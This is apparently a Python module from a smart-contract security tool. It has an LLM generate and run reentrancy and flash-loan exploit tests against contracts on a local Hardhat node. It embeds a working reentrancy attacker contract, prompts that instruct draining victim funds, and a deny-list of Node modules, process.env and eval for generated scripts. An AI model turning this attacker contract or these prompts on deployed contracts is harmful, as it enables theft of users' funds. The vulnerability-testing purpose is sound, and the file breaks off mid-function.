"""
Attacker Agent — Reentrancy Exploit Automation

Reads the Neo4j graph for a contract, identifies functions with
MAKES_EXTERNAL_CALL_BEFORE_STATE_UPDATE edges, generates Hardhat/Mocha
exploit test scripts via NimClient, executes them in a sandboxed subprocess,
and classifies the outcome using Mocha's JSON reporter as the sole source
of truth.

Three-way outcome classification:
  EXPLOIT_SUCCEEDED — Mocha test passed (funds drained, real vulnerability)
  EXPLOIT_BLOCKED   — Mocha test failed (exploit attempted, contract defended)
  SCRIPT_ERROR      — Script failed to run (broken JS, timeout, blocked import, etc.)

SCRIPT_ERROR is the default. A broken script can NEVER masquerade as a safe result.
"""

import json
import os
import re
import shutil
import subprocess
import uuid
from pathlib import Path

from app.db.neo4j_client import NeoClient
from app.llm.nim_client import NimClient

# ---------------------------------------------------------------------------
# Constants
# ---------------------------------------------------------------------------

BLOCKCHAIN_DIR = Path(__file__).resolve().parent.parent.parent / "blockchain"
TEST_DIR = BLOCKCHAIN_DIR / "test"
EXPLOIT_CONFIG = "hardhat.config.exploit.js"

# Outcome constants
EXPLOIT_SUCCEEDED = "EXPLOIT_SUCCEEDED"
EXPLOIT_BLOCKED = "EXPLOIT_BLOCKED"
SCRIPT_ERROR = "SCRIPT_ERROR"

# Environment variables to strip from subprocess (secrets the LLM-generated
# script must never be able to read)
_STRIPPED_ENV_VARS = frozenset({
    "NIM_API_KEY",
    "NEO4J_PASSWORD",
    "NEO4J_URI",
    "NEO4J_USER",
})

# Dangerous patterns that trigger a hard block before execution.
# If any of these appear in the generated script, the subprocess is NEVER
# spawned and the result is SCRIPT_ERROR immediately.
_DANGEROUS_PATTERNS = [
    r"""require\s*\(\s*['"]fs['"]\s*\)""",
    r"""require\s*\(\s*['"]child_process['"]\s*\)""",
    r"""require\s*\(\s*['"]net['"]\s*\)""",
    r"""require\s*\(\s*['"]http['"]\s*\)""",
    r"""require\s*\(\s*['"]https['"]\s*\)""",
    r"""require\s*\(\s*['"]os['"]\s*\)""",
    r"""require\s*\(\s*['"]path['"]\s*\)""",
    r"""import\s+.*from\s+['"]fs['"]""",
    r"""import\s+.*from\s+['"]child_process['"]""",
    r"""import\s+.*from\s+['"]net['"]""",
    r"""import\s+.*from\s+['"]http['"]""",
    r"""import\s+.*from\s+['"]os['"]""",
    r"""process\.env""",
    r"""\beval\s*\(""",
    r"""\bFunction\s*\(""",
]

_DANGEROUS_RE = re.compile("|".join(_DANGEROUS_PATTERNS))

# Subprocess timeout in seconds
_SUBPROCESS_TIMEOUT = 60

# Fixed path generic attacker template
GENERIC_ATTACKER_SOURCE = """// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract GenericAttacker {
    address public target;
    bytes public callbackPayload;
    uint256 public maxLoops;
    uint256 public currentLoops;

    function setup(address _target, bytes memory _callbackPayload, uint256 _maxLoops) external {
        target = _target;
        callbackPayload = _callbackPayload;
        maxLoops = _maxLoops;
    }

    function trigger(bytes memory initialPayload) external payable {
        currentLoops = 0;
        (bool success, ) = target.call{value: msg.value}(initialPayload);
        require(success, "Initial call failed");
    }

    receive() external payable {
        if (currentLoops < maxLoops) {
            currentLoops++;
            (bool success, ) = target.call(callbackPayload);
        }
    }
}
"""

GENERIC_FLASH_BORROWER_SOURCE = """// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract GenericFlashBorrower {
    address public target;
    bytes public attackPayload;
    
    function setup(address _target, bytes memory _attackPayload) external {
        target = _target;
        attackPayload = _attackPayload;
    }
    
    function executeAttack() external payable {
        (bool success, ) = target.call{value: msg.value}(attackPayload);
        require(success, "Attack call failed");
    }
    
    receive() external payable {}
}
"""

# ---------------------------------------------------------------------------
# Public API
# ---------------------------------------------------------------------------

def attempt_reentrancy_exploit(
    contract_id: str,
    deployment_info: dict,
    source_code: str,
) -> dict:
    """Attempt reentrancy exploits against all flagged functions in a contract.

    Args:
        contract_id: SHA-256 hex digest identifying the contract in Neo4j.
        deployment_info: Dict from deploy_contract() with keys:
            ``address`` (str), ``abi`` (list), ``success`` (bool).
        source_code: The full Solidity source code of the contract.

    Returns:
        A dict with ``contract_id`` and ``results`` (list of per-function
        exploit result dicts).
    """
    neo_client = NeoClient()
    graph = neo_client.read_graph(contract_id)

    # Find functions that have a MAKES_EXTERNAL_CALL_BEFORE_STATE_UPDATE edge
    flagged_edges = [
        edge for edge in graph.get("edges", [])
        if edge.get("type") == "MAKES_EXTERNAL_CALL_BEFORE_STATE_UPDATE"
    ]

    if not flagged_edges:
        return {
            "contract_id": contract_id,
            "results": [],
            "summary": "No functions flagged with MAKES_EXTERNAL_CALL_BEFORE_STATE_UPDATE edges.",
        }

    # Group edges by function name (a function may have multiple flagged edges)
    funcs_to_edges: dict[str, list[dict]] = {}
    for edge in flagged_edges:
        func_name = edge["from"]
        funcs_to_edges.setdefault(func_name, []).append(edge)

    # Look up function details from the graph
    func_details = {f["name"]: f for f in graph.get("functions", [])}

    nim_client = NimClient()
    results = []

    for func_name, edges in funcs_to_edges.items():
        func_info = func_details.get(func_name, {"name": func_name})
        result = _run_single_exploit(
            func_name=func_name,
            func_info=func_info,
            edges=edges,
            deployment_info=deployment_info,
            source_code=source_code,
            nim_client=nim_client,
        )
        results.append(result)

    return {
        "contract_id": contract_id,
        "results": results,
    }



def _check_flashloan_semantics_with_llm(nim_client: NimClient, func_name: str, reads: list[str], writes: list[str], source_code: str) -> tuple[bool | None, str]:
    system_prompt = (
        "You are a strict security classification filter. Your job is to analyze ONE SPECIFIC Solidity function "
        "and answer YES or NO to a single question.\n\n"
        "QUESTION: Does THIS SPECIFIC function's logic depend on a price, exchange rate, or reserve ratio "
        "computed from mutable on-chain state, where that value could be skewed by a preceding "
        "transaction in the same block?\n\n"
        "CRITICAL RULES:\n"
        "1. You MUST ONLY evaluate the function named in the prompt.\n"
        "2. DO NOT evaluate other functions in the contract, even if they are vulnerable.\n"
        "3. If the specific function requested does NOT compute or use a price/ratio itself, you MUST return false.\n"
        "4. Respond strictly with a JSON object in this format:\n"
        "{\"is_price_dependent\": true/false, \"reasoning\": \"1-2 sentences why\"}"
    )
    user_prompt = (
        f"Function to Analyze: {func_name}\n"
        f"Reads: {reads}\n"
        f"Writes: {writes}\n"
        f"Source code:\n{source_code}\n\n"
        "Does this function's logic depend on a price, exchange rate, or reserve ratio computed from mutable on-chain state, where that value could be skewed by a preceding transaction in the same block?\n"
        "Respond in JSON only."
    )
    
    for attempt in range(1, 4):
        try:
            response = nim_client.generate(
                system_prompt=system_prompt,
                user_prompt=user_prompt,
                reasoning=False
            )
            print(f"NIM classification attempt {attempt} response: {response}")
            
            # The base Llama model is heavily tuned to output <think>...</think>.
            # Even when we override max_reasoning_tokens to 0, the chat template
            # sometimes bleeds a literal `</think>` tag into the output text.
            # Assuming the model won't legitimately output `</think>` inside its JSON reasoning.
            # If it does, .split() will eat the first part of the JSON, causing a JSONDecodeError
            # below, which is safely caught by our 3-attempt retry loop.
            clean_response = response.split("</think>")[-1].strip()
            # Strip markdown if present
            if clean_response.startswith("```json"):
                clean_response = clean_response[7:]
            elif clean_response.startswith("```"):
                clean_response = clean_response[3:]
            if clean_response.endswith("```"):
                clean_response = clean_response[:-3]
            clean_response = clean_response.strip()
            
            try:
                data = json.loads(clean_response)
                return data.get("is_price_dependent", False), data.get("reasoning", "Parsed successfully")
            except json.JSONDecodeError as parse_err:
                print(f"JSON decode error on attempt {attempt}: {parse_err}")
                continue # loop to retry
                
        except Exception as e:
            print(f"API/Network error on attempt {attempt}: {e}")
            continue # loop to retry
            
    # If all 3 retries exhaust, return None so it is explicitly inconclusive, not False
    return None, "classification_inconclusive"

def attempt_flashloan_exploit(
    contract_id: str,
    deployment_info: dict,
    source_code: str,
) -> dict:
    neo_client = NeoClient()
    graph = neo_client.read_graph(contract_id)
    nim_client = NimClient()
    
    flagged_funcs = []
    results = []
    
    for func in graph.get("functions", []):
        func_name = func["name"]
        if func.get("visibility", "internal") not in ("public", "external"):
            continue
            
        reads = func.get("reads", [])
        writes = func.get("writes", [])
        overlap = set(reads) & set(writes)
        
        if overlap:
            print(f"Checking semantics for {func_name}...", flush=True)
            is_candidate, reasoning = _check_flashloan_semantics_with_llm(nim_client, func_name, reads, writes, source_code)
            print(f"Result for {func_name}: {is_candidate}", flush=True)
            
            if is_candidate is None:
                # Retries exhausted, record inconclusive failure without attempting exploit
                results.append({
                    "function_name": func_name,
                    "exploit_outcome": "CLASSIFICATION_INCONCLUSIVE",
                    "reasoning": reasoning
                })
            elif is_candidate:
                flagged_funcs.append((func, reasoning))
                new_edges = [
                    {
                        "type": "USES_MANIPULABLE_PRICE_SOURCE",
                        "from": func_name,
                        "to": var_name
                    }
                    for var_name in sorted(list(overlap))
                ]
                neo_client.write_graph(contract_id, {"edges": new_edges})
                
    if not flagged_funcs:
        return {
            "contract_id": contract_id,
            "results": results,
            "summary": "No functions flagged as flash-loan candidates.",
        }

    for func_info, reasoning in flagged_funcs:
        # Redeploy the contract for this exploit attempt to avoid state contamination from previous attempts
        current_deployment_info = deployment_info
        redeploy_failed = False
        redeploy_err_msg = ""
        try:
            from blockchain.deploy_interface import deploy_contract
            import re
            contract_name_match = re.search(r"contract\s+(\w+)", source_code)
            if contract_name_match:
                contract_name = contract_name_match.group(1)
                print(f"Redeploying {contract_name} for function {func_info['name']} exploit run...", flush=True)
                fresh_deployment_info = deploy_contract(contract_name, source_code)
                if fresh_deployment_info and fresh_deployment_info.get("success"):
                    current_deployment_info = fresh_deployment_info
                else:
                    redeploy_failed = True
                    redeploy_err_msg = "Deployment returned unsuccessful status"
        except Exception as redeploy_err:
            redeploy_failed = True
            redeploy_err_msg = str(redeploy_err)
            print(f"Failed to redeploy contract: {redeploy_err}", flush=True)

        if redeploy_failed:
            # If redeployment fails, record it as an infrastructure failure instead of silently proceeding with mutated state
            results.append({
                "function_name": func_info["name"],
                "exploit_outcome": "REDEPLOY_FAILED",
                "reasoning": reasoning,
                "redeploy_warning": f"Failed to redeploy fresh contract state: {redeploy_err_msg}",
                "attempts": [
                    {
                        "script_error": f"Failed to redeploy fresh contract state: {redeploy_err_msg}",
                        "exploit_outcome": "SCRIPT_ERROR",
                    }
                ]
            })
            continue

        # We pass reasoning in via the edges param (which is unused by flashloan prompt builder except to pass it)
        # Or better, we just pass reasoning in edges dict.
        edges = [{"type": "LLM_FLASHLOAN_REASONING", "reasoning": reasoning}]
        result = _run_single_exploit(
            func_name=func_info["name"],
            func_info=func_info,
            edges=edges,
            deployment_info=current_deployment_info,
            source_code=source_code,
            nim_client=nim_client,
            attack_type="flashloan"
        )
        # Attach the LLM reasoning to the output
        result["classification_reasoning"] = reasoning
        results.append(result)

    return {
        "contract_id": contract_id,
        "results": results,
    }

# ---------------------------------------------------------------------------
# Prompt Construction
# ---------------------------------------------------------------------------

def _build_exploit_prompt(
    func_name: str,
    func_info: dict,
    edges: list[dict],
    deployment_info: dict,
    source_code: str,
) -> tuple[str, str]:
    """Build the system and user prompts for exploit script generation.

    Returns:
        (system_prompt, user_prompt) tuple.
    """
    contract_address = deployment_info.get("address", "UNKNOWN")
    abi_json = json.dumps(deployment_info.get("abi", []), indent=2)

    edge_descriptions = "\n".join(
        f"  - Function '{e['from']}' makes an external call BEFORE updating "
        f"state variable '{e['to']}'"
        for e in edges
    )

    func_visibility = func_info.get("visibility", "unknown")
    func_is_payable = func_info.get("is_payable", False)
    func_reads = func_info.get("reads", [])
    func_writes = func_info.get("writes", [])

    system_prompt = (
        "You are a smart contract security researcher specializing in "
        "reentrancy exploits. You write Hardhat/Mocha test scripts that "
        "attempt to exploit vulnerable Solidity contracts deployed on a "
        "local Hardhat node.\n\n"
        "CRITICAL RULES:\n"
        "1. Produce exactly ONE describe() block with exactly ONE it() test case.\n"
        "2. The single it() test must assert whether the attacker contract "
        "successfully drained funds from the victim contract. A PASSING test "
        "means the exploit SUCCEEDED (funds were drained). A FAILING test "
        "means the exploit was BLOCKED.\n"
        "3. Do NOT include multiple test cases, setup tests, or cleanup tests.\n"
        "4. You MUST start the file with exactly these imports:\n"
        "   const { ethers } = require('hardhat');\n"
        "   const { expect } = require('chai');\n"
        "5. A pre-compiled generic attacker contract named 'GenericAttacker' "
        "is already available in the environment. You MUST NOT write or compile "
        "inline Solidity code.\n"
        "6. Do NOT import or require 'fs', 'child_process', 'net', 'http', "
        "'os', 'path'. Do NOT use eval(), Function(), or process.env.\n"
        "7. Output ONLY the complete JavaScript test file content. No markdown "
        "fences, no explanations, no comments outside the code.\n"
        "8. The victim contract is already deployed at the address provided. "
        "Connect to it using ethers and the ABI provided.\n"
        "9. You MUST follow the explicit 6-step deployment and attack sequence "
        "provided in the prompt.\n\n"
        "CRITICAL ETHERS v6 API REFERENCE:\n"
        "This project uses Ethers v6. You MUST use v6 syntax. Common v5-to-v6 changes:\n"
        "- Deployment: `const c = await factory.deploy(); await c.waitForDeployment();` (Do NOT use .deployed())\n"
        "- Contract Address: `await c.getAddress()` (Do NOT use c.address)\n"
        "- Interface: `new ethers.Interface(abi)` (Do NOT use ethers.utils.Interface)\n"
        "- Parsing Ether: `ethers.parseEther(\"1.0\")` (Do NOT use ethers.utils.parseEther)\n"
        "- Getting Balance: `await ethers.provider.getBalance(address)`\n"
        "- Variables: Use `let`, not `const`, for any variable reassigned later in the script.\n"
        "- BigNumber: Do NOT use `ethers.BigNumber.from()`. It is removed in v6. Use native BigInt (e.g., `1000n` or `ethers.parseEther(\"1000\")`).\n"
        "- Math/Comparisons: Do NOT use `.gt()`, `.lt()`, `.add()`, `.sub()`, `.mul()`, `.div()`, or `.eq()`. Use native BigInt operators: `>`, `<`, `+`, `-`, `*`, `/`, `==`. Example: `if (finalBalance > initialBalance)`\n"
    )

    user_prompt = (
        f"## Exploit Target\n\n"
        f"**Vulnerable function:** `{func_name}`\n"
        f"  - Visibility: {func_visibility}\n"
        f"  - Payable: {func_is_payable}\n"
        f"  - Reads state variables: {func_reads}\n"
        f"  - Writes state variables: {func_writes}\n\n"
        f"**Flagged reentrancy edges:**\n{edge_descriptions}\n\n"
        f"**Deployed contract address:** `{contract_address}`\n\n"
        f"**Contract ABI:**\n```json\n{abi_json}\n```\n\n"
        f"**Full Solidity source code:**\n```solidity\n{source_code}\n```\n\n"
        f"Write a Hardhat/Mocha test script (.cjs format) that strictly follows "
        f"this numbered execution sequence:\n"
        f"1. Fetch the generic attacker factory: `const factory = await ethers.getContractFactory(\"GenericAttacker\");`\n"
        f"2. Deploy it: `const attacker = await factory.deploy(); await attacker.waitForDeployment();`\n"
        f"3. Call `attacker.setup('{contract_address}', encodedWithdrawCalldata, 2)` "
        f"to configure the reentrancy loop payload and set the target. Encode the `{func_name}` call using the victim's ABI.\n"
        f"4. Call `attacker.trigger(encodedDepositCalldata, {{ value: depositAmount, gasLimit: 15000000 }})` "
        f"to fund the victim normally. Encode the deposit call using the victim's ABI.\n"
        f"5. Call `attacker.trigger(encodedWithdrawCalldata, {{ gasLimit: 15000000 }})` "
        f"(with NO value) to initiate the attack loop.\n"
        f"6. Assert that the attacker contract's final ETH balance is strictly greater "
        f"than `depositAmount` (NOT greater than the pre-attack balance) - this proves "
        f"multiple withdrawals occurred via reentrancy, not just one legitimate single withdrawal.\n\n"
        f"Remember: exactly ONE describe() block, exactly ONE it() test case. "
        f"A passing test = exploit succeeded = vulnerability confirmed."
    )

    return system_prompt, user_prompt



def _build_flashloan_exploit_prompt(
    func_name: str,
    func_info: dict,
    edges: list[dict],
    deployment_info: dict,
    source_code: str,
) -> tuple[str, str]:
    contract_address = deployment_info.get("address", "UNKNOWN")
    abi_json = json.dumps(deployment_info.get("abi", []), indent=2)
    
    reasoning = edges[0]["reasoning"] if edges and "reasoning" in edges[0] else "Dependent on mutable on-chain state"
    
    system_prompt = (
        "You are a smart contract security researcher specializing in "
        "flash-loan and price-manipulation exploits. You write Hardhat/Mocha test scripts that "
        "attempt to exploit vulnerable Solidity contracts deployed on a "
        "local Hardhat node.\n\n"
        "CRITICAL RULES:\n"
        "1. Produce exactly ONE describe() block with exactly ONE it() test case.\n"
        "2. The single it() test must assert whether the attacker successfully "
        "drained the vast majority of funds from the victim contract. A PASSING test "
        "means the exploit SUCCEEDED. Because minor rounding or division precision issues can "
        "leave a small dust balance in the victim contract, you MUST assert that the victim contract's "
        "final balance has decreased by at least 90% (or is less than 10% of its initial balance), "
        "rather than checking if it is exactly 0. A FAILING test "
        "means the exploit was BLOCKED.\n"
        "3. Do NOT include multiple test cases, setup tests, or cleanup tests.\n"
        "4. You MUST start the file with exactly these imports:\n"
        "   const { ethers } = require('hardhat');\n"
        "   const { expect } = require('chai');\n"
        "5. A pre-compiled generic helper contract named 'GenericFlashBorrower' "
        "is already available in the environment. You MUST NOT write or compile "
        "inline Solidity code.\n"
        "6. Do NOT import or require 'fs', 'child_process', 'net', 'http', "
        "'os', 'path'. Do NOT use eval(), Function(), or process.env.\n"
        "7. Output ONLY the complete JavaScript test file content. No markdown "
        "fences, no explanations, no comments outside the code.\n"
        "8. The victim contract is already deployed at the address provided. "
        "Connect to it using ethers and the ABI provided.\n"
        "9. You MUST follow the explicit manipulation and attack sequence "
        "provided in the prompt.\n\n"
        "CRITICAL ETHERS v6 API REFERENCE:\n"
        "This project uses Ethers v6. You MUST use v6 syntax. Common v5-to-v6 changes:\n"
        "- Deployment: `const c = await factory.deploy(); await c.waitForDeployment();` (Do NOT use .deployed())\n"
        "- Contract Address: `await c.getAddress()` (Do NOT use c.address)\n"
        "- Interface: `new ethers.Interface(abi)` (Do NOT use ethers.utils.Interface)\n"
        "- Parsing Ether: `ethers.parseEther(\"1.0\")` (Do NOT use ethers.utils.parseEther)\n"
        "- Getting Balance: `await ethers.provider.getBalance(address)`\n"
        "- Variables: Use `let`, not `const`, for any variable reassigned later in the script.\n"
        "- BigNumber: Do NOT use `ethers.BigNumber.from()`. It is removed in v6. Use native BigInt (e.g., `1000n` or `ethers.parseEther(\"1000\")`).\n"
        "- Math/Comparisons: Do NOT use `.gt()`, `.lt()`, `.add()`, `.sub()`, `.mul()`, `.div()`, or `.eq()`. Use native BigInt operators: `>`, `<`, `+`, `-`, `*`, `/`, `==`. Example: `if (finalBalance > initialBalance)`\n"
    )

    user_prompt = (
        f"## Exploit Target\n\n"
        f"**Vulnerable function:** `{func_name}`\n"
        f"**Vulnerability Reasoning:** {reasoning}\n\n"
        f"**Deployed contract address:** `{contract_address}`\n\n"
        f"**Contract ABI:**\n```json\n{abi_json}\n```\n\n"
        f"**Full Solidity source code:**\n```solidity\n{source_code}\n```\n\n"
        f"Write a Hardhat/Mocha test script (.cjs format) that proves this vulnerability "
        f"by exploiting the price manipulation flaw. Your test must execute the following sequence:\n"
        f"1. Manipulate the price: call the pool's swap/deposit functions with a very large amount "
        f"of ETH (e.g. 1000 ETH) from one of the signer accounts to heavily skew the reserve ratio/spot price.\n"
        f"2. Trigger the exploit: call `{func_name}` (using a different signer if needed, or the same one) "
        f"which will execute at the heavily manipulated price.\n"
        f"3. Reverse the manipulation (optional if needed to realize profit).\n"
        f"4. Assert that the attacker made a profit (e.g. final ETH balance is greater than initial balance, "
        f"or the contract was drained).\n\n"
        f"Remember: exactly ONE describe() block, exactly ONE it() test case. "
        f"A passing test = exploit succeeded = vulnerability confirmed."
    )

    return system_prompt, user_prompt

# ---------------------------------------------------------------------------
# Dangerous Import Scanner (HARD GATE)
# ---------------------------------------------------------------------------

def _scan_for_dangerous_imports(script_content: str) -> str | None:
    """Pre-execution safety scan of generated script content.

    This is a HARD BLOCKING GATE. If this returns a non-None value,
    the subprocess must NEVER be spawned.

    Args:
        script_content: The full text of the generated JS script.

    Returns:
        None if the script is safe to execute.
        An error message string if dangerous patterns were detected.
    """
    match = _DANGEROUS_RE.search(script_content)
    if match:
        return (
            f"BLOCKED: Generated script contains dangerous pattern: "
            f"'{match.group()}'. Script was NOT executed."
        )
    return None


# ---------------------------------------------------------------------------
# Mocha JSON Parser
# ---------------------------------------------------------------------------

def _parse_mocha_json(stdout: str) -> dict | None:
    """Attempt to parse Mocha JSON reporter output from subprocess stdout.

    Args:
        stdout: Raw stdout from the subprocess.

    Returns:
        Parsed JSON dict if valid Mocha output, None otherwise.
    """
    try:
        data = json.loads(stdout)
    except (json.JSONDecodeError, TypeError):
        return None

    # Verify it has the expected Mocha structure
    if not isinstance(data, dict) or "stats" not in data:
        return None

    return data


# ---------------------------------------------------------------------------
# Extract JS Code from LLM Response
# ---------------------------------------------------------------------------

def _extract_js_code(llm_response: str) -> str:
    """Extract JavaScript code from the LLM response.

    The LLM is instructed to output raw code only, but may wrap it in
    markdown fences. This function handles both cases.
    """
    # Try to extract from markdown code fences first
    fence_pattern = re.compile(
        r"```(?:javascript|js|cjs)?\s*\n(.*?)```",
        re.DOTALL,
    )
    match = fence_pattern.search(llm_response)
    if match:
        return match.group(1).strip()

    # If no fences found, the LLM might have output pure code or a mix.
    # We find the first require or import statement to strip preamble text.
    stripped = llm_response.strip()
    match = re.search(r"(const .*require|let .*require|import .*)", stripped)
    if match:
        return stripped[match.start():]
    return stripped


# ---------------------------------------------------------------------------
# Single Exploit Runner
# ---------------------------------------------------------------------------

def _run_single_exploit(
    func_name: str,
    func_info: dict,
    edges: list[dict],
    deployment_info: dict,
    source_code: str,
    nim_client: NimClient,
    attack_type: str = "reentrancy",
) -> dict:
    """Orchestrate a single exploit attempt for one flagged function.

    Creates a scratch directory, generates the exploit script via NimClient,
    scans it for dangerous imports, executes it, parses the Mocha JSON
    result, and classifies the outcome.

    The scratch directory is ALWAYS cleaned up in a finally block.

    Returns:
        A result dict with keys: function_name, exploit_attempted,
        exploit_outcome, exploit_succeeded, drained_amount,
        raw_test_output, script_error.
    """
    created_scratch_dirs = []

    # Default result — SCRIPT_ERROR is the safe default
    result = {
        "function_name": func_name,
        "exploit_attempted": False,
        "exploit_outcome": SCRIPT_ERROR,
        "exploit_succeeded": False,
        "drained_amount": None,
        "raw_test_output": "",
        "script_content": "",
        "script_error": None,
        "attempts": []
    }

    try:
        # --- Step 0: Write helper contract ---
        helpers_dir = BLOCKCHAIN_DIR / "contracts" / "helpers"
        helpers_dir.mkdir(parents=True, exist_ok=True)
        if attack_type == "flashloan":
            helper_path = helpers_dir / "GenericFlashBorrower.sol"
            helper_path.write_text(GENERIC_FLASH_BORROWER_SOURCE, encoding="utf-8")
        else:
            helper_path = helpers_dir / "GenericAttacker.sol"
            helper_path.write_text(GENERIC_ATTACKER_SOURCE, encoding="utf-8")

        for attempt_num in range(1, 4):
            scratch_id = str(uuid.uuid4())
            scratch_dir = TEST_DIR / f"scratch_{scratch_id}"
            script_path = scratch_dir / "exploit.cjs"
            created_scratch_dirs.append(scratch_dir)

            attempt_log = {
                "attempt": attempt_num,
                "exploit_outcome": SCRIPT_ERROR,
                "script_error": None,
                "raw_test_output": "",
                "script_content": ""
            }

            # --- Step 1: Generate exploit script via LLM ---
            if attack_type == "flashloan":
                system_prompt, user_prompt = _build_flashloan_exploit_prompt(
                    func_name, func_info, edges, deployment_info, source_code
                )
            else:
                system_prompt, user_prompt = _build_exploit_prompt(
                    func_name=func_name,
                    func_info=func_info,
                    edges=edges,
                    deployment_info=deployment_info,
                    source_code=source_code,
                )

            # If this is a retry, append the previous attempt's error to the prompt
            if attempt_num > 1 and result["attempts"]:
                last_error = result["attempts"][-1].get("script_error")
                last_script = result["attempts"][-1].get("script_content")
                if last_error:
                    injection = (
                        f"\n\n**CRITICAL FIX REQUIRED:**\n"
                        f"Your previous attempt failed with the following error:\n"
                        f"```\n{last_error}\n```\n"
                    )
                    if last_script:
                        injection += (
                            f"\nHere is the script you generated that caused the error:\n"
                            f"```javascript\n{last_script}\n```\n"
                        )
                    injection += "\nYou MUST fix this specific issue in your new script."
                    print("========== INJECTED RETRY PROMPT ==========")
                    print(injection)
                    print("===========================================")
                    user_prompt += injection

            try:
                print(f"Generating exploit script via LLM (Attempt {attempt_num})...", flush=True)
                llm_response = nim_client.generate(
                    system_prompt=system_prompt,
                    user_prompt=user_prompt,
                    reasoning=True,
                    max_tokens=12288,
                )
            except Exception as e:
                err_msg = str(e)
                if "truncated due to max_tokens" in err_msg or "truncated" in err_msg:
                    attempt_log["script_error"] = "LLM response truncated due to max_tokens limit — script incomplete"
                else:
                    attempt_log["script_error"] = f"LLM generation failed: {err_msg}"
                result["attempts"].append(attempt_log)
                continue

            # --- Step 2: Extract JS code from response ---
            script_content = _extract_js_code(llm_response)
            attempt_log["script_content"] = script_content

            if not script_content or len(script_content.strip()) < 20:
                attempt_log["script_error"] = (
                    "LLM returned empty or too-short script content."
                )
                result["attempts"].append(attempt_log)
                continue

            # --- Step 3: HARD GATE — dangerous import scan ---
            scan_error = _scan_for_dangerous_imports(script_content)
            if scan_error is not None:
                attempt_log["script_error"] = scan_error
                result["attempts"].append(attempt_log)
                continue

            # --- Step 4: Write script to scratch directory ---
            scratch_dir.mkdir(parents=True, exist_ok=True)
            script_path.write_text(script_content, encoding="utf-8")

            # --- Step 5: Build safe environment (strip secrets) ---
            safe_env = os.environ.copy()
            for var in _STRIPPED_ENV_VARS:
                safe_env.pop(var, None)

            # --- Step 6: Execute via subprocess ---
            npx_cmd = "npx.cmd" if os.name == "nt" else "npx"
            # Path relative to BLOCKCHAIN_DIR for Hardhat
            relative_script = script_path.relative_to(BLOCKCHAIN_DIR)

            result["exploit_attempted"] = True

            try:
                print(f"Executing exploit script via Hardhat (Attempt {attempt_num})...", flush=True)
                proc = subprocess.run(
                    [
                        npx_cmd, "hardhat",
                        "--config", EXPLOIT_CONFIG,
                        "--network", "localhost",
                        "test", str(relative_script),
                    ],
                    cwd=str(BLOCKCHAIN_DIR),
                    env=safe_env,
                    capture_output=True,
                    text=True,
                    timeout=_SUBPROCESS_TIMEOUT,
                )
            except subprocess.TimeoutExpired as e:
                attempt_log["raw_test_output"] = (e.stdout or "") + (e.stderr or "")
                attempt_log["script_error"] = (
                    f"Subprocess timed out after {_SUBPROCESS_TIMEOUT} seconds."
                )
                result["attempts"].append(attempt_log)
                continue
            except OSError as e:
                attempt_log["raw_test_output"] = f"[ENVIRONMENT_ERROR] Failed to start Hardhat test toolchain: {str(e)}"
                attempt_log["script_error"] = f"ENVIRONMENT_ERROR: {str(e)}"
                attempt_log["exploit_outcome"] = SCRIPT_ERROR
                result["attempts"].append(attempt_log)
                # Environment errors (like missing npx) won't be fixed by retrying the LLM script. Break immediately.
                break

            # Capture full output for debugging
            attempt_log["raw_test_output"] = (
                f"--- STDOUT ---\n{proc.stdout}\n"
                f"--- STDERR ---\n{proc.stderr}\n"
                f"--- EXIT CODE: {proc.returncode} ---"
            )

            # --- Step 7: Parse Mocha JSON and classify outcome ---
            mocha_json = _parse_mocha_json(proc.stdout)

            if mocha_json is None:
                # No valid Mocha JSON → SCRIPT_ERROR
                attempt_log["script_error"] = (
                    "Mocha did not produce valid JSON output. "
                    "The generated script likely has syntax errors or "
                    "failed to load."
                )
                result["attempts"].append(attempt_log)
                continue

            stats = mocha_json.get("stats", {})
            passes = stats.get("passes", 0)
            failures = stats.get("failures", 0)

            if passes > 0 and failures == 0:
                # All tests passed → exploit drained funds
                attempt_log["exploit_outcome"] = EXPLOIT_SUCCEEDED
                result["exploit_succeeded"] = True
                # Try to extract drained amount from test output if available
                result["drained_amount"] = _extract_drained_amount(mocha_json)
                result["attempts"].append(attempt_log)
                break

            elif failures > 0:
                # We must distinguish between genuine assertion failures (the contract
                # blocked the exploit) and script crashes (TypeError, etc.)
                genuine_assertion_failure = False
                for test in stats.get("failures", []) if isinstance(stats.get("failures"), list) else mocha_json.get("failures", []):
                    err = test.get("err", {})
                    err_message = err.get("message", "").lower()
                    err_name = err.get("name", "").lower()
                    # Chai AssertionError or on-chain revert acting as contract defense
                    if (
                        "assertionerror" in err_name 
                        or "expected " in err_message
                        or "reverted with reason string" in err_message
                        or "reverted with custom error" in err_message
                        or "reverted with panic code" in err_message
                    ):
                        genuine_assertion_failure = True
                        break

                if genuine_assertion_failure:
                    # Tests ran but assertions failed → exploit was genuinely blocked
                    attempt_log["exploit_outcome"] = EXPLOIT_BLOCKED
                    attempt_log["script_error"] = f"AssertionError: {err_message}"
                    result["exploit_succeeded"] = False
                    result["attempts"].append(attempt_log)
                    break
                else:
                    # The script crashed before finishing the test logic
                    attempt_log["exploit_outcome"] = SCRIPT_ERROR
                    attempt_log["script_error"] = (
                        "The generated test crashed with a runtime error instead of "
                        "failing an assertion. The exploit logic did not complete."
                    )
                    result["attempts"].append(attempt_log)
                    continue

            else:
                # 0 passes AND 0 failures → no tests actually ran
                attempt_log["exploit_outcome"] = SCRIPT_ERROR
                attempt_log["script_error"] = (
                    "Mocha found no tests to run (0 passes, 0 failures). "
                    "The generated script likely has an empty describe() block."
                )
                result["attempts"].append(attempt_log)
                continue

        # After the loop, update final `result` from the last `attempt_log`
        last_attempt = result["attempts"][-1] if result["attempts"] else None
        if last_attempt:
            result["exploit_outcome"] = last_attempt["exploit_outcome"]
            result["script_error"] = last_attempt["script_error"]
            result["raw_test_output"] = last_attempt["raw_test_output"]
            result["script_content"] = last_attempt["script_content"]

        return result

    finally:
        # ALWAYS clean up scratch directories
        for d in created_scratch_dirs:
            if d.exists():
                try:
                    shutil.rmtree(d)
                except OSError:
                    pass  # Best-effort cleanup


# ---------------------------------------------------------------------------
# Helpers
# ---------------------------------------------------------------------------

def _extract_drained_amount(mocha_json: dict) -> str | None:
    """Try to extract a drained amount from Mocha test output.

    This is best-effort — the LLM-generated test may or may not include
    this information in the test title or error message.

    Returns:
        A string describing the drained amount, or None.
    """
    for test in mocha_json.get("passes", []):
        title = test.get("fullTitle", "")
        # Look for patterns like "drained X ETH" in test titles
